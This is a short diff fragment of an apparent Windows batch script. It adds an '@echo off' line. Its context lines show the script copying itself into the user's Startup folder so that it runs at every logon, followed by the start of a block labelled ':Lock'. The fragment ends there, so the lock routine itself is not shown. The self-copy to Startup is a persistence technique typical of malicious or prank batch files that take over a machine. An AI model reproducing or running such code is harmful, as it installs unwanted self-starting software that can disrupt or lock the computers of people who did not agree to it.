@@ -1,3 +1,4 @@
+@echo off
 COPY %0 "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 (
 :Lock
